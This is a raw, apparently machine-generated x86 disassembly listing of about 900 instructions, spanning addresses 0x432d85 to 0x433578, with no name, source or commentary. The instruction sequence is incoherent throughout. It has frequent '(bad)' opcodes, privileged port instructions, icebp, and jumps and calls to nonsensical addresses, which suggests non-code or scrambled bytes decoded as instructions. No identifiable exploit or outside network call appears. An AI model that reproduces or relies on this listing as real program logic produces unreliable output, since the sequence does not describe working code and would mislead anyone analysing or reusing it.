  432d85:	aam    0x75
  432d87:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d8d:	mov    DWORD PTR [ebx-0x50],edx
  432d90:	test   BYTE PTR [ebp-0x1],0xe8
  432d94:	mov    eax,DWORD PTR [eax]
  432d96:	hlt    
  432d97:	add    al,al
  432d99:	mov    eax,DWORD PTR ds:0x890045a8
  432d9f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432da5:	inc    DWORD PTR [eax*2+0xf75854d]
  432dac:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432db2:	call   0x72998af3
  432db7:	je     0x432e17
  432db9:	js     0x432e1a
  432dbb:	lock ret 0x7e
  432dbf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432dc5:	mov    edi,edi
  432dc7:	sbb    al,bl
  432dc9:	clc    
  432dca:	add    BYTE PTR [ebp-0x73],bh
  432dcd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432dd3:	ror    BYTE PTR [eax],1
  432dd5:	dec    ebp
  432dd6:	xchg   ebp,eax
  432dd7:	mov    edi,edi
  432dd9:	in     al,0x8b
  432ddb:	jge    0x432d66
  432ddd:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432de3:	clc    
  432de4:	pop    esi
  432de5:	fist   DWORD PTR [ebp+0x5d398b5d]
  432deb:	clc    
  432dec:	add    al,0x6e
  432dee:	mov    eax,DWORD PTR [ebx]
  432df0:	mov    BYTE PTR [ebp+0x0],dl
  432df3:	mov    edx,DWORD PTR [ebx-0x20]
  432df6:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432dfc:	add    eax,0x3b3b73
  432e01:	adc    al,0x89
  432e03:	pop    eax
  432e04:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432e08:	ret    0xf08
  432e0b:	cmp    al,0x2
  432e0d:	mov    edx,eax
  432e0f:	cld    
  432e10:	add    BYTE PTR [ebp+0x66],dl
  432e13:	add    eax,ebx
  432e15:	add    esp,eax
  432e17:	sub    eax,eax
  432e19:	or     BYTE PTR [ecx-0x77f474bb],cl
  432e1f:	add    BYTE PTR [eax],al
  432e21:	mov    DWORD PTR [ebx-0x24],ebx
  432e24:	push   edi
  432e25:	push   ebp
  432e26:	clc    
  432e27:	add    DWORD PTR [esi+0x1b0100],0x45
  432e2e:	out    0xff,eax
  432e30:	add    edx,DWORD PTR [eax]
  432e32:	jmp    0x432e1c
  432e34:	cmp    ch,0x46
  432e37:	(bad)  
  432e38:	jmp    0x40c8b68a
  432e3d:	je     0x432dc9
  432e3f:	mov    eax,DWORD PTR [eax-0x10c78104]
  432e45:	inc    ebp
  432e46:	add    BYTE PTR [ebx-0x770375],al
  432e4c:	add    ah,ch
  432e4e:	add    edx,esp
  432e50:	pop    edi
  432e51:	pop    ebp
  432e52:	push   ebp
  432e53:	inc    ebx
  432e54:	in     al,dx
  432e55:	pop    ebp
  432e56:	in     al,dx
  432e57:	cmp    edx,DWORD PTR [edi-0x8]
  432e5a:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432e61:	add    al,0x47
  432e63:	push   ebp
  432e64:	mov    esp,ebp
  432e66:	in     al,0x45
  432e68:	dec    ebp
  432e69:	push   esi
  432e6a:	test   DWORD PTR [eax+0xfb010f],esi
  432e70:	add    BYTE PTR [eax+0xc018b],dh
  432e76:	leave  
  432e77:	inc    ebp
  432e78:	test   al,ch
  432e7a:	add    dh,bh
  432e7c:	add    bh,bh
  432e7e:	dec    ebp
  432e7f:	push   cs
  432e80:	mov    DWORD PTR [ecx],eax
  432e82:	hlt    
  432e83:	push   es
  432e84:	dec    ebp
  432e85:	leave  
  432e86:	mov    DWORD PTR [eax],ecx
  432e88:	clc    
  432e89:	cmovge eax,ecx
  432e8c:	mov    ecx,0x85c2f0
  432e92:	clc    
  432e93:	pop    DWORD PTR [ebp+0x1]
  432e96:	push   ebx
  432e97:	add    BYTE PTR [ebp-0x15],bh
  432e9a:	push   esi
  432e9b:	xor    eax,0x898a45
  432ea0:	cld    
  432ea1:	add    al,BYTE PTR [ebp+0x0]
  432ea4:	xor    esp,DWORD PTR [esi-0x64]
  432ea7:	add    DWORD PTR [esi+0x78308c1],edi
  432ead:	add    ah,BYTE PTR [ebp-0x49]
  432eb0:	int    0xbb
  432eb2:	mov    ecx,DWORD PTR [esi+0xc]
  432eb5:	add    dh,al
  432eb7:	cmp    ecx,ebx
  432eb9:	jne    0x432e83
  432ebb:	xor    ecx,DWORD PTR [ebp+0x66]
  432ebe:	jmp    0xca2ec4
  432ec3:	add    DWORD PTR [ebp+0x0],eax
  432ec6:	mov    eax,ebx
  432ec8:	or     al,0x8b
  432eca:	(bad)  
  432ecb:	mov    ecx,esi
  432ecd:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432ed4:	mov    eax,edi
  432ed6:	or     BYTE PTR [edx],cl
  432ed8:	shl    cl,cl
  432eda:	icebp  
  432edb:	add    BYTE PTR [ebp+0x38],0x8b
  432edf:	or     BYTE PTR [edx+eax*2],cl
  432ee2:	(bad)  
  432ee3:	or     cl,dh
  432ee5:	stc    
  432ee6:	shl    DWORD PTR [ebp-0x30],0xc6
  432eea:	xor    al,0x0
  432eec:	inc    ebp
  432eed:	xchg   BYTE PTR [ebx],al
  432eef:	add    esp,edi
  432ef1:	add    BYTE PTR [ebp-0x39],cl
  432ef4:	mov    al,bl
  432ef6:	test   DWORD PTR [ebx+0x1c348375],ecx
  432efc:	sub    al,0xbf
  432efe:	jmp    0x432e85
  432f00:	mov    edi,eax
  432f02:	lock jge 0x432ef6
  432f05:	lea    esi,[edx-0x74bad5ff]
  432f0b:	mov    ebp,esp
  432f0d:	or     cl,dh
  432f0f:	leave  
  432f10:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432f17:	dec    ebp
  432f18:	dec    ebp
  432f19:	test   DWORD PTR [ebx],eax
  432f1b:	paddb  mm6,mm0
  432f1e:	add    DWORD PTR [eax],eax
  432f20:	dec    ebp
  432f21:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432f27:	mov    esi,DWORD PTR [edx]
  432f29:	or     al,0x2b
  432f2b:	dec    ebp
  432f2c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432f32:	mov    esp,edi
  432f34:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432f3b:	mov    DWORD PTR [ebx],ebp
  432f3d:	call   0xc76b86d
  432f42:	mov    DWORD PTR [ebp+0x10],ecx
  432f45:	(bad)  
  432f46:	push   0x8b85ff10
  432f4b:	clc    
  432f4c:	or     al,0x54
  432f4e:	(bad)  
  432f4f:	push   ecx
  432f50:	retf   
  432f51:	mov    ebx,0xff4d8dc8
  432f56:	mov    DWORD PTR [ebp+0x8],eax
  432f59:	xor    eax,DWORD PTR [ebp-0x75]
  432f5c:	cmp    ebp,DWORD PTR [ebx]
  432f5e:	lsl    ebx,WORD PTR [edi-0x8]
  432f62:	call   DWORD PTR [ebx-0x741bff75]
  432f68:	(bad)  
  432f69:	or     al,0x5b
  432f6b:	dec    ebp
  432f6c:	or     BYTE PTR [ebx],dh
  432f6e:	inc    ebp
  432f6f:	xor    esi,DWORD PTR ds:0x708088d
  432f75:	in     eax,0x9b
  432f77:	add    BYTE PTR [edx],dh
  432f79:	inc    ebp
  432f7a:	pop    edi
  432f7b:	xor    eax,edx
  432f7d:	test   DWORD PTR [eax],0x81108b8b
  432f83:	dec    ebp
  432f84:	sub    al,0x33
  432f86:	add    BYTE PTR [ebx],dh
  432f88:	push   esi
  432f89:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f8f:	mov    edi,eax
  432f91:	or     BYTE PTR [ebp+0x45],al
  432f94:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f9a:	xor    ecx,ecx
  432f9c:	pushf  
  432f9d:	push   es
  432f9e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432fa5:	dec    ebp
  432fa6:	inc    ebp
  432fa7:	cmp    BYTE PTR [ecx],0x54
  432faa:	pushf  
  432fab:	gs (bad) 
  432fad:	shl    esp,1
  432faf:	dec    ebp
  432fb0:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432fb6:	shr    ecx,1
  432fb8:	xlat   BYTE PTR ds:[ebx]
  432fb9:	rol    bh,cl
  432fbb:	mov    edx,esp
  432fbd:	or     BYTE PTR [ebp+0x4588f84d],al
  432fc3:	mov    ecx,DWORD PTR [eax]
  432fc5:	or     BYTE PTR [eax],al
  432fc7:	push   ebp
  432fc8:	mov    edi,DWORD PTR [eax+0xfc728b]
  432fce:	dec    ebp
  432fcf:	enter  0xceba,0x8
  432fd3:	retf   0x1807
  432fd6:	ret    0x9b4d
  432fd9:	mov    esi,DWORD PTR [edx]
  432fdb:	or     al,0x33
  432fdd:	into   
  432fde:	add    edx,esi
  432fe0:	add    ecx,edx
  432fe2:	bswap  eax
  432fe4:	ror    esi,0x98
  432fe7:	dec    ebp
  432fe8:	add    cl,ch
  432fea:	mov    edi,edi
  432fec:	hlt    
  432fed:	inc    esi
  432fef:	inc    ebp
  432ff0:	ret    0x4533
  432ff3:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432ff9:	or     BYTE PTR [ebx],dh
  432ffb:	dec    ebp
  432ffc:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  433002:	jne    0xff8d2fc9
  433008:	inc    ebp
  433009:	inc    ebp
  43300a:	mov    esi,DWORD PTR [ebx]
  43300c:	clc    
  43300d:	pop    esi
  43300e:	ret    0xcaeb
  433011:	mov    eax,esi
  433013:	call   0x520484e6
  433018:	dec    ebp
  433019:	add    eax,0xf8728b
  43301e:	adc    eax,0xce0ccac9
  433023:	push   ebp
  433024:	ret    0xc6ec
  433027:	in     al,dx
  433028:	call   0x33437d31
  43302d:	push   edi
  43302e:	add    edi,eax
  433030:	xor    eax,eax
  433032:	jmp    0x433079
  433034:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  43303a:	add    eax,edi
  43303c:	shr    eax,cl
  43303e:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  433044:	mov    esi,DWORD PTR [edx]
  433046:	in     al,dx
  433047:	pushf  
  433048:	ret    0x84c7
  43304b:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  433051:	inc    ebp
  433052:	in     al,dx
  433053:	xor    DWORD PTR [ebp-0x64],eax
  433056:	mov    eax,edi
  433058:	cld    
  433059:	fmul   st(2),st
  43305b:	sbb    dl,al
  43305d:	jmp    0x9c3b:0x304d45c1
  433064:	jbe    0x43302d
  433066:	mov    esp,eax
  433068:	clc    
  433069:	add    BYTE PTR [ebp+0x0],cl
  43306c:	mov    ecx,ecx
  43306e:	lea    eax,[ebp-0x5]
  433071:	mov    edi,edi
  433073:	call   0x51ce84bd
  433078:	hlt    
  433079:	xor    eax,edx
  43307b:	mov    esi,0x9b7284
  433080:	xor    cl,dl
  433082:	mov    esi,eax
  433084:	hlt    
  433085:	into   
  433086:	inc    ebp
  433087:	scas   eax,DWORD PTR es:[edi]
  433088:	mov    ebp,ecx
  43308a:	cld    
  43308b:	add    dl,cl
  43308d:	add    dl,al
  43308f:	inc    ebp
  433090:	shr    DWORD PTR [ebx],0x4d
  433093:	xor    edi,DWORD PTR [ebx]
  433095:	mov    DWORD PTR [edi],ecx
  433097:	clc    
  433098:	dec    esi
  433099:	inc    ebp
  43309a:	dec    DWORD PTR [ebx-0x3d2b1775]
  4330a0:	ret    0xc6ca
  4330a3:	mov    BYTE PTR [ebp-0x32],0x53
  4330a7:	scas   eax,DWORD PTR es:[edi]
  4330a8:	inc    ebp
  4330a9:	jmp    0x4330db
  4330ab:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  4330b2:	pop    ebx
  4330b3:	xor    ecx,DWORD PTR [ebp+0x3]
  4330b6:	mov    eax,DWORD PTR [ebx]
  4330b8:	clc    
  4330b9:	test   edx,ecx
  4330bb:	mov    ecx,esi
  4330bd:	cld    
  4330be:	call   0x8ab77608
  4330c3:	xor    ecx,DWORD PTR [eax+0x4533f303]
  4330c9:	add    ecx,DWORD PTR [ebx-0x4974072d]
  4330cf:	fdiv   QWORD PTR [ebx]
  4330d1:	retf   0xce89
  4330d4:	in     al,0xc1
  4330d6:	inc    ebp
  4330d7:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  4330dd:	into   
  4330de:	mov    dh,0xc1
  4330e1:	call   0x8c17766a
  4330e6:	(bad)  
  4330e7:	cld    
  4330e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4330eb:	xor    eax,ecx
  4330ed:	lea    eax,[ebp+0x8]
  4330f0:	mov    esi,DWORD PTR [edx-0x4]
  4330f3:	add    dl,al
  4330f5:	inc    ebp
  4330f6:	mov    esp,0x32d89b8b
  4330fb:	dec    ebp
  4330fc:	mov    esi,DWORD PTR [ebx]
  4330fe:	cld    
  4330ff:	xor    eax,edx
  433101:	sub    esp,DWORD PTR [ebp-0x75]
  433104:	int    0xec
  433106:	sub    ecx,eax
  433108:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  43310e:	mov    esi,esp
  433110:	call   0x34177e99
  433115:	inc    DWORD PTR [ebx]
  433117:	mov    edi,DWORD PTR [ebx]
  433119:	cld    
  43311a:	jne    0x433169
  43311c:	mov    esi,DWORD PTR [ebx]
  43311e:	aam    0x8d
  433120:	dec    ebp
  433121:	or     BYTE PTR [ebx],dh
  433123:	jb     0x433128
  433125:	add    BYTE PTR [edi+0x45],bl
  433128:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  43312f:	xor    ebp,esp
  433131:	xor    eax,edi
  433133:	sub    edi,esp
  433135:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  43313b:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433142:	inc    ebp
  433143:	xor    ecx,DWORD PTR [ecx+0x45891403]
  433149:	clc    
  43314a:	mov    eax,edi
  43314c:	nop
  43314d:	fadd   QWORD PTR [eax]
  43314f:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433155:	jmp    0x4330e0
  433157:	mov    eax,DWORD PTR [ecx]
  433159:	fadd   DWORD PTR [eax]
  43315b:	inc    ebp
  43315c:	or     DWORD PTR [ebx],esi
  43315e:	dec    eax
  43315f:	add    edx,DWORD PTR [ebx-0x2d]
  433162:	dec    ebp
  433163:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  433169:	inc    ebp
  43316a:	push   esp
  43316b:	mov    dl,BYTE PTR [ecx-0xd]
  43316e:	xor    ecx,DWORD PTR [ebp-0x45]
  433171:	(bad)  
  433173:	rol    BYTE PTR [eax],0xc1
  433176:	ret    
  433177:	inc    ebp
  433178:	inc    ebp
  433179:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  43317f:	xor    eax,ebx
  433181:	add    eax,DWORD PTR [ebp+0x23]
  433184:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43318a:	cmp    edi,0xc
  43318d:	dec    ebp
  43318e:	inc    ebp
  43318f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433195:	inc    ebp
  433196:	mov    esi,DWORD PTR [ebx]
  433198:	clc    
  433199:	lea    eax,[ebp+0x45725407]
  43319f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  4331a3:	xor    edi,DWORD PTR [eax]
  4331a5:	mov    ecx,0xff8b8d4d
  4331aa:	push   esp
  4331ab:	enter  0x4df7,0x23
  4331af:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  4331b5:	mov    eax,DWORD PTR [ebx]
  4331b7:	loopne 0x4331a4
  4331b9:	ret    0xc68b
  4331bc:	push   esp
  4331bd:	enter  0x9745,0x8b
  4331c1:	inc    ebp
  4331c2:	cld    
  4331c3:	mov    eax,edi
  4331c5:	clc    
  4331c6:	ret    
  4331c7:	ret    0xc645
  4331ca:	mov    esi,DWORD PTR [ebx]
  4331cc:	cld    
  4331cd:	pop    esi
  4331ce:	mov    ebx,0x83458bc3
  4331d4:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  4331d8:	dec    ebp
  4331d9:	xor    DWORD PTR [ebx],esi
  4331db:	pushf  
  4331dc:	add    edi,DWORD PTR [edx-0x7767a77]
  4331e2:	fcom   DWORD PTR [ebp+0x45]
  4331e5:	mov    esi,DWORD PTR [ebx]
  4331e7:	adc    al,0x9c
  4331e9:	inc    ebp
  4331ea:	(bad)  
  4331eb:	mov    ebx,eax
  4331ed:	adc    al,0x85
  4331ef:	cmp    al,0x1
  4331f2:	inc    ebp
  4331f3:	add    BYTE PTR ds:0xe98b9c4d,bh
  4331f9:	mov    eax,DWORD PTR [ebx]
  4331fb:	nop
  4331fc:	add    BYTE PTR [eax],al
  4331fe:	inc    ebp
  4331ff:	mov    esi,DWORD PTR [ebx]
  433201:	add    eax,DWORD PTR [ebx]
  433203:	cmp    al,0x89
  433205:	mov    esp,esi
  433207:	clc    
  433208:	inc    ebp
  433209:	inc    ebp
  43320a:	add    edx,DWORD PTR [esi+0xc]
  43320d:	mov    edi,0x7ff0845
  433212:	in     al,dx
  433213:	(bad)  
  433214:	jne    0x4331b1
  433216:	mov    esi,DWORD PTR [edx]
  433218:	clc    
  433219:	add    ebp,DWORD PTR [esi]
  43321b:	mov    edi,edi
  43321d:	in     al,dx
  43321e:	mov    DWORD PTR [ebp-0x10],eax
  433221:	xor    eax,DWORD PTR [ebp+0x3]
  433224:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  43322a:	fmul   DWORD PTR [ebx-0x173caf39]
  433230:	lea    ecx,[ecx+0x45e8d4bc]
  433236:	clc    
  433237:	mov    edi,edi
  433239:	cmp    BYTE PTR [ebp+0x4d],al
  43323c:	test   DWORD PTR [eax+0x74],ecx
  43323f:	inc    ecx
  433240:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  433246:	ret    
  433247:	inc    eax
  433248:	dec    DWORD PTR [ebx+0x4945f8f0]
  43324e:	push   eax
  43324f:	dec    eax
  433250:	test   al,0xd0
  433252:	dec    eax
  433254:	mov    eax,DWORD PTR [ebp-0x14]
  433257:	mov    eax,DWORD PTR [ebp+0x38]
  43325a:	mov    eax,ecx
  43325c:	fadd   DWORD PTR [ebx]
  43325e:	dec    ebp
  43325f:	inc    eax
  433260:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  433266:	inc    ebp
  433267:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  43326d:	fadd   QWORD PTR [ebx]
  43326f:	inc    ebp
  433270:	or     al,0x33
  433272:	dec    ebp
  433273:	add    edi,DWORD PTR [ebx]
  433275:	mov    DWORD PTR [edx-0x28],esi
  433278:	mov    eax,DWORD PTR [ebp-0x10]
  43327b:	mov    eax,DWORD PTR [eax+0x10]
  43327e:	mov    eax,edi
  433280:	lock ret 
  433282:	inc    ecx
  433283:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433289:	fsubr  st,st(5)
  43328b:	test   DWORD PTR [eax],eax
  43328d:	clc    
  43328e:	push   0x45
  433290:	(bad)  
  433291:	cmp    al,0xec
  433293:	pushf  
  433294:	inc    ebp
  433295:	(bad)  
  433296:	push   eax
  433297:	fsub   DWORD PTR [eax-0x7b]
  43329a:	(bad)  
  43329b:	clc    
  43329c:	mov    eax,0xf8008584
  4332a1:	mov    eax,DWORD PTR [ebp-0x4]
  4332a4:	mov    edi,0x4585c3cc
  4332aa:	clc    
  4332ab:	mov    eax,DWORD PTR [ebp+0x14]
  4332ae:	xor    eax,DWORD PTR [ebp-0x64]
  4332b1:	mov    edi,eax
  4332b3:	in     al,dx
  4332b4:	les    esi,FWORD PTR [ebp-0x7b]
  4332b7:	mov    edi,eax
  4332b9:	or     al,0x4d
  4332bb:	dec    ebp
  4332bc:	mov    eax,ebp
  4332be:	in     al,0xf2
  4332c0:	dec    ebp
  4332c1:	dec    DWORD PTR [ecx+0x4dc7e045]
  4332c7:	fmul   DWORD PTR [ecx+0x4df8f085]
  4332cd:	inc    ebp
  4332ce:	mov    DWORD PTR [ebx],esi
  4332d0:	fadd   QWORD PTR [ebx]
  4332d2:	dec    ebp
  4332d3:	push   eax
  4332d4:	xor    eax,DWORD PTR [ebp+0x3]
  4332d7:	push   eax
  4332d8:	mov    DWORD PTR [eax+ebx*8],ebx
  4332db:	push   esi
  4332dd:	mov    eax,DWORD PTR [eax]
  4332df:	lock cmp eax,0xf84e85c0
  4332e5:	inc    ebp
  4332e6:	test   BYTE PTR [ebx],dh
  4332e8:	add    DWORD PTR [ebx],eax
  4332ea:	add    BYTE PTR [eax+0x4d],dl
  4332ed:	jne    0x433322
  4332ef:	lea    ecx,[ebx-0x7617fc44]
  4332f5:	div    ah
  4332f7:	inc    DWORD PTR [ebp+0x45]
  4332fa:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433300:	jb     0x43328d
  433302:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433309:	mov    ecx,DWORD PTR [ebp-0x10]
  43330c:	xor    ecx,DWORD PTR [ebp+0x3]
  43330f:	mov    edi,DWORD PTR [ebx]
  433311:	adc    BYTE PTR [ebp+0x41],dh
  433314:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43331a:	ret    
  43331b:	push   ss
  43331c:	push   0x45
  43331e:	lea    ecx,[ebx+0x4de80cb0]
  433324:	sti    
  433325:	add    edi,edi
  433327:	or     BYTE PTR [ebp+0x4d],al
  43332a:	mov    ebp,DWORD PTR [ebx]
  43332c:	xor    ebp,ecx
  43332e:	mov    al,BYTE PTR [edx]
  433330:	add    eax,0xc7200
  433335:	jne    0x433384
  433337:	lea    esi,[ebx]
  433339:	mov    al,0xf
  43333b:	call   0xf2a00
  433340:	shl    DWORD PTR [ecx],0x84
  433343:	pushf  
  433344:	add    DWORD PTR [ecx+0x4545d000],ecx
  43334a:	mov    esi,DWORD PTR [edx]
  43334c:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  433353:	test   DWORD PTR [eax],eax
  433355:	clc    
  433356:	dec    ebp
  433357:	inc    ebp
  433358:	xor    edi,DWORD PTR [edi+ecx*1]
  43335b:	pushf  
  43335c:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  433363:	lea    eax,[ecx]
  433365:	int3   
  433366:	add    BYTE PTR [ebp+0x45],cl
  433369:	lea    ecx,[ebx-0x75b2cc38]
  43336f:	lea    eax,ds:0x4d72c4
  433375:	mov    ecx,DWORD PTR [ebp-0x4]
  433378:	xor    ecx,edi
  43337a:	bswap  ebx
  43337c:	ror    BYTE PTR [ebp-0x35],0xe9
  433380:	rol    DWORD PTR [ecx],0x84
  433383:	add    BYTE PTR [ecx],al
  433385:	xor    eax,DWORD PTR [eax]
  433387:	pushf  
  433388:	inc    ebp
  433389:	jnp    0x8a43678c
  43338f:	mov    eax,DWORD PTR ds:0xcf72e8
  433395:	lock dec ebp
  433397:	retf   
  433398:	xor    ecx,DWORD PTR [ebp+0xf]
  43339b:	mov    eax,eax
  43339d:	fmul   st,st(3)
  43339f:	test   ecx,0x19b8484
  4333a5:	xor    al,BYTE PTR [eax]
  4333a7:	mov    DWORD PTR [ebp-0x28],eax
  4333aa:	mov    eax,DWORD PTR [ebp+0x33]
  4333ad:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  4333b3:	ret    
  4333b4:	add    al,cl
  4333b6:	dec    ebp
  4333b7:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  4333bd:	add    ecx,DWORD PTR ds:0xc7250
  4333c3:	inc    ebp
  4333c4:	rcl    DWORD PTR [eax+0x4d],0x2b
  4333c8:	mov    edi,edi
  4333ca:	xor    ecx,DWORD PTR [ebx+0xde48a]
  4333d0:	jb     0x433399
  4333d2:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4333d9:	mov    esi,DWORD PTR [ebx]
  4333db:	cld    
  4333dc:	mov    cl,bh
  4333de:	or     eax,0x372b6
  4333e3:	cmp    ecx,eax
  4333e5:	jne    0x433462
  4333eb:	mov    eax,DWORD PTR [ebp-0x20]
  4333ee:	mov    eax,DWORD PTR [eax]
  4333f0:	xor    eax,edi
  4333f2:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4333f9:	mov    ecx,DWORD PTR [ebp-0x4]
  4333fc:	mov    ecx,edi
  4333fe:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433404:	jb     0x433415
  433406:	add    BYTE PTR [edi-0x3f],dl
  433409:	add    BYTE PTR [ebp-0x75],cl
  43340c:	mov    esi,eax
  43340e:	xor    eax,DWORD PTR [eax]
  433410:	mov    al,bh
  433412:	or     eax,0x4b7284
  433417:	xor    al,cl
  433419:	mov    ecx,DWORD PTR [ebp-0x4]
  43341c:	mov    ecx,edi
  43341e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433424:	jb     0x433435
  433426:	add    BYTE PTR [edi],dh
  433428:	enter  0x8500,0x8b
  43342c:	add    ah,bl
  43342e:	add    BYTE PTR [eax],al
  433430:	inc    ebp
  433431:	(bad)  
  433432:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  433439:	mov    esi,DWORD PTR [edx-0x4]
  43343c:	add    bh,cl
  43343e:	dec    ebp
  43343f:	mov    dh,0x8b
  433441:	add    esi,DWORD PTR [ebx]
  433443:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  433449:	add    BYTE PTR [eax],al
  43344b:	mov    eax,ecx
  43344d:	loopne 0x43349c
  43344f:	add    BYTE PTR [ebx-0x757bcc39],cl
  433455:	dec    ebx
  433456:	or     eax,0x8b7232
  43345b:	in     al,0xc1
  43345d:	or     DWORD PTR [ebp-0x31],ecx
  433460:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  433467:	xor    dh,BYTE PTR [edx-0x75]
  43346a:	add    al,dh
  43346c:	enter  0x4f09,0xcf
  433470:	inc    ebp
  433471:	mov    WORD PTR [ebx-0x75cdccb5],cs
  433477:	or     al,BYTE PTR ds:0xe4728b
  43347d:	or     DWORD PTR [ebp-0x31],ecx
  433480:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433487:	cmp    dh,BYTE PTR [edx+0xf]
  43348a:	add    bl,dl
  43348c:	rol    DWORD PTR [eax],0x4d
  43348f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433495:	(bad)  
  433496:	or     eax,0x4b7284
  43349b:	xor    al,cl
  43349d:	mov    ecx,DWORD PTR [ebp-0x20]
  4334a0:	mov    ecx,DWORD PTR [ecx]
  4334a2:	xor    ecx,edi
  4334a4:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  4334ab:	xor    cl,al
  4334ad:	mov    ecx,DWORD PTR [edi]
  4334af:	fadd   QWORD PTR [ebp+0x9]
  4334b2:	call   0xffd02f86
  4334b7:	dec    ebx
  4334b8:	dec    ebp
  4334b9:	xor    bh,BYTE PTR [ebx]
  4334bb:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  4334bf:	loopne 0x4334bd
  4334c1:	or     edi,eax
  4334c3:	iret   
  4334c4:	ret    
  4334c5:	mov    WORD PTR [ebp+0x4f],es
  4334c8:	mov    esi,DWORD PTR [edx]
  4334ca:	call   0x8452fc09
  4334cf:	(bad)  
  4334d0:	fwait
  4334d1:	add    BYTE PTR [edx],dh
  4334d3:	mov    esi,DWORD PTR [ebx]
  4334d5:	fmul   QWORD PTR [ebx+0x55c7fc00]
  4334db:	test   BYTE PTR [ebx],dh
  4334dd:	dec    ebx
  4334de:	add    esi,DWORD PTR [edx]
  4334e0:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4334e6:	dec    edi
  4334e8:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  4334ef:	xor    al,BYTE PTR [ebx]
  4334f1:	mov    edi,DWORD PTR [ebx]
  4334f3:	in     al,0x75
  4334f5:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4334fb:	dec    ebx
  4334fc:	xor    esi,DWORD PTR [edx]
  4334fe:	lea    ecx,[edx]
  433500:	or     BYTE PTR [ebx+0x900f072],cl
  433506:	ja     0x4334d7
  433508:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43350f:	cmp    ch,al
  433511:	jne    0x433506
  433513:	mov    edi,edi
  433515:	fadd   QWORD PTR [ebp+0x0]
  433518:	mov    eax,edi
  43351a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  433521:	mov    edx,DWORD PTR [ebx]
  433523:	in     al,0x45
  433525:	or     DWORD PTR [ebx],esi
  433527:	iret   
  433528:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  43352f:	xor    dl,BYTE PTR [eax-0x75]
  433532:	sbb    al,0xe0
  433534:	dec    DWORD PTR [ecx]
  433536:	mov    ecx,edi
  433538:	in     al,dx
  433539:	mov    eax,es
  43353b:	dec    ebx
  43353c:	mov    DWORD PTR [edx],esi
  43353e:	fmul   QWORD PTR [edx]
  433540:	jne    0x4334cd
  433542:	(bad)  
  433543:	(bad)  
  433545:	or     DWORD PTR [ebp-0x31],eax
  433548:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  43354f:	cmp    bh,bh
  433551:	jne    0x433598
  433553:	lea    ecx,[ebx-0x38372750]
  433559:	inc    ebx
  43355b:	mov    eax,ecx
  43355d:	mov    eax,0xa00c111
  433562:	jne    0x4335a9
  433564:	mov    esi,DWORD PTR [ebx]
  433566:	test   al,0x3
  433568:	inc    ebp
  433569:	mov    DWORD PTR [eax-0xc],edx
  43356c:	loop   0x4335b3
  43356e:	push   DWORD PTR [ebx]
  433570:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  433576:	add    DWORD PTR [eax],eax
  433578:	mov    eax,edi
